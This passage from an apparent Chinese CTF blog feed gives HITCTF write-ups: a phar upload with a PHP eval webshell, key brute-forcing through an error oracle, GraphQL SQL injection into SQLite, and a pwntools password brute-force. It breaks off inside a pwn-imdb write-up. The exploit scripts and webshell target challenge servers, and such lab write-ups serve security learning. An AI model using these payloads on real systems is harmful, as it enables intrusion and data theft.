class="string">'c.phar'</span>);</span><br><span class="line">$phar-&gt;buildFromDirectory(<span class="string">'./c'</span>);</span><br><span class="line">$phar-&gt;setStub($phar-&gt;createDefaultStub(<span class="string">'e.php'</span>, <span class="string">' =&gt; .php'</span>));</span><br><span class="line">$phar-&gt;compressFiles(Phar::GZ);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">s = <span class="string">" =&gt; "</span></span><br><span class="line">host = <span class="string">"120.24.215.80"</span></span><br><span class="line">port = <span class="number">10012</span></span><br><span class="line">url = <span class="string">"http://%s:%d/login.php?debug=hitctf"</span> % (host, port)</span><br><span class="line">content = open(<span class="string">'c.phar'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">username = content[:<span class="number">15</span>]</span><br><span class="line">password = content[<span class="number">15</span> + len(s):]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] User : [%s]"</span> % (urllib.quote(username))</span><br><span class="line">data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:password&#125;</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">print</span> response.content</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] http://%s:%d/?page=phar://log/%s.log/c&amp;c=phpinfo();"</span> % (host, port, urllib.quote(username))</span><br></pre></td></tr></table></figure></p><p>2.直接传phar，由于开头加了东西，需要修改phar包的校验值。(<a href="http://php.net/manual/en/phar.fileformat.signature.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.signature.php</a>)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'shell.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$phar[<span class="string">'shell.php'</span>] = <span class="string">'&lt;?php eval($_POST[\'cmd\']);?&gt;'</span> ;</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>留意最后28个字节，最后4字节是固定标识，倒数4-8字节是hash类型，这里是0x02代表sha1，由于开头会增加字节，删掉最后28字节，加上增加的开头，重新计算sha1。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSha1</span><span class="params">(filename)</span>:</span> </span><br><span class="line">    sha1Obj = sha1()</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        sha1Obj.update(f.read())</span><br><span class="line">    <span class="keyword">return</span> sha1Obj.hexdigest()</span><br></pre></td></tr></table></figure></p><h3 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h3><p>可参考：<a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a></p><p><a href="http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc" target="_blank" rel="noopener">http://123.206.83.157:8000/<strong>pycache</strong>/app.cpython-35.pyc</a>反编译得到：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_key = os.environ[<span class="string">'KEY'</span>]</span><br><span class="line">flag_enc = <span class="string">'9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, flag_enc = flag_enc)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">'/'</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    req = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">None</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    key = <span class="keyword">None</span>[<span class="string">'key'</span>]</span><br><span class="line">    <span class="keyword">if</span> len(key) != len(flag_key):</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(key, flag_key):</span><br><span class="line">        <span class="keyword">if</span> ord(x) ^ ord(y):  <span class="comment">#注意这里，可以通过这里报错来确定key长度</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, <span class="string">b'0000000000000000'</span>)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(flag_enc))</span><br><span class="line">    flag = plain_text.decode(<span class="string">'utf-8'</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> jsonify(result = <span class="keyword">True</span>, flag = flag)</span><br><span class="line"></span><br><span class="line">getflag = app.route(<span class="string">'/getflag'</span>, methods = [</span><br><span class="line">    <span class="string">'POST'</span>])(getflag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><p>对于None类型，ord(None)会崩溃掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; key = [None,None]</span><br><span class="line">&gt;&gt;&gt; ord(key[1])</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: ord() expected string of length 1, but NoneType found</span><br></pre></td></tr></table></figure></p><p>JSON里面null会在python里面转换成none。</p><p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（15个null）时：false</p><p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：500 Internal Server Error，可以确定key为16位</p><p>同样，我们可以利用false和500报错来逐位爆破key</p><p>当POST数据为<code>{&quot;key&quot;:[&quot;a&quot;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：false</p><p>当POST数据为<code>{&quot;key&quot;:[&quot;5&quot;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：500 Internal Server Error</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://123.206.83.157:8000/getflag"</span></span><br><span class="line">proxy = &#123;<span class="string">'http'</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</span><br><span class="line">key = [<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    key[index] = str(chr(i))</span><br><span class="line">    payload = &#123;<span class="string">"key"</span>:key&#125;</span><br><span class="line">    text = requests.post(url,json=payload,proxies=proxy).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"500 Internal Server Error"</span> <span class="keyword">in</span> text :</span><br><span class="line">      print(<span class="string">""</span>.join(key[:index+<span class="number">1</span>]))</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"true"</span> <span class="keyword">in</span> text:</span><br><span class="line">      print(<span class="string">""</span>.join(key))</span><br><span class="line">      exit()   <span class="comment">#5ecur3pPYpyPYk3y</span></span><br></pre></td></tr></table></figure><h3 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h3><p>抓包看一下post的数据，是graphql，一个查询API，编码是base32<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=&#123; getscorebyid(id: &quot;GE======&quot;)&#123; id name score &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>随便改一下<code>getscorebyxx</code>，可以看到报错发现还有<code>getscorebyyourname</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[GraphQLError(&apos;Cannot query field &quot;getscoreby222&quot; on type &quot;Query&quot;. Did you mean &quot;getscorebyid&quot; or &quot;getscorebyyourname&quot;?&apos;,)]</span><br></pre></td></tr></table></figure><p>测试发现id只能1位数，那么只能从那么入手，写个代码测试注入，hackbar无base32比较麻烦<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  base64 <span class="keyword">import</span> b32encode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://182.254.247.127:3001/graphql"</span></span><br><span class="line">payload = <span class="string">"1' or '1'='1"</span></span><br><span class="line">q = <span class="string">'&#123; getscorebyyourname(name: "%s")&#123; name score &#125; &#125;'</span>%(b32encode(payload))</span><br><span class="line">r = requests.post(url=url,data=&#123;<span class="string">"query"</span> : q&#125;)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>测试发现存在注入，<code>payload = &quot;1&#39; union select 1-- &quot;</code>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &quot;1&apos; union select 1-- &quot;), (u&apos;score&apos;, &apos;1&apos;)]))])</span><br></pre></td></tr></table></figure></p><p>常用套路测试<code>payload = &quot;1&#39; union select database()-- &quot;</code>，发现不是mysql，是sqlite。先爆一下表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;-1&apos; UNION ALL SELECT name FROM sqlite_master WHERE type=\&quot;table\&quot; limit 1,1--&quot;</span><br><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &apos;-1\&apos; UNION ALL SELECT name FROM sqlite_master WHERE type=&quot;table&quot; limit 1,1--&apos;), (u&apos;score&apos;, &apos;Secr3t_fl4g&apos;)]))])</span><br></pre></td></tr></table></figure></p><p>发现fSecr3t_fl4g表了，搞掂~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;-1&apos; UNION ALL SELECT * from Secr3t_fl4g--&quot;</span><br><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &quot;-1&apos; UNION ALL SELECT * from Secr3t_fl4g--&quot;), (u&apos;score&apos;, &apos;HITCTF&#123;fee26d3a146a404e106b1ed93156f30e&#125;&apos;)]))])</span><br></pre></td></tr></table></figure></p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to 7HxzZ login system!"</span>);</span><br><span class="line">  v4 = login();</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Login successful\nBut you have no permission to get the flag!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How can you login successful as root!\nThere must be something wrong with the login function,let me check again!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Checking......"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check() &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Don't fool me, you are not the true root user!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is your flag: "</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求输入用户名和密码，需要使用root登录，来看一下login()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">255</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Username: "</span>);</span><br><span class="line">  n = read_input_raw((<span class="keyword">int</span>)username, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Password: "</span>);</span><br><span class="line">  v3 = read_input_raw((<span class="keyword">int</span>)password, <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(username, <span class="string">"root"</span>, n) &amp;&amp; !<span class="built_in">strncmp</span>(password, <span class="string">"passwd_has_be_changed_in_remote_"</span>, v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的密码比较有问题，你输入多少位，就比较多少位，例如你只输入一位，那么就只比较第一位是不是跟root密码一样。这里可以绕过，后面还有一个check()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">"passwd_has_be_changed_in_remote_"</span>, <span class="number">0x20</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Correct password!"</span>);</span><br><span class="line">    ++v1;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的密码比较就是固定32位，可以猜想真正密码是32位，可以利用login()进行逐位爆破。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'password'</span> + chr(x)</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Username:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'root'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">    p.sendline(password+chr(x))</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="keyword">print</span> a </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'successful'</span> <span class="keyword">in</span> a:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">if</span> login(j):</span><br><span class="line">                password += chr(j)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'password:'</span>,password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span> <span class="comment">#10_adhUNwj_qidACn_qdXon912_uhdq6</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easy-xor-apk&quot;&gt;&lt;a href=&quot;#easy-xor-apk&quot; class=&quot;headerlink&quot; title=&quot;easy_xor.apk&quot;&gt;&lt;/a&gt;easy_xor.apk&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pwn-imdb</title>
    <link href="http://yoursite.com/2018/01/30/pwn-imdb/"/>
    <id>http://yoursite.com/2018/01/30/pwn-imdb/</id>
    <published>2018-01-30T01:58:32.000Z</published>
    <updated>2018-01-30T05:16:38.516Z</updated>
    
    <content type="html"><![CDATA[<p>blog已经搭了一段时间了，拖延症发作，一直没写。最近没做什么有意思的题，就写一下某CTF群的入群题解题思路。</p><h2 id="程序伪代码"><a href="#程序伪代码" class="headerlink" title="程序伪代码"></a>程序伪代码</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*** Welcome to IMDB ***"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    -- search for movies and TVs here\n----------------------------------------"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        add_tv();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        add_movie();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        remove();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序基本功能是添加tv或者movie，可以删除指定name的，以及显示所有记录。</p><h3 id="add-tv"><a href="#add-tv" class="headerlink" title="add_tv"></a>add_tv</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0xD0</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD0</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_tv;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Season? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  *(_DWORD *)(v0 + <span class="number">204</span>) = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV introduction? 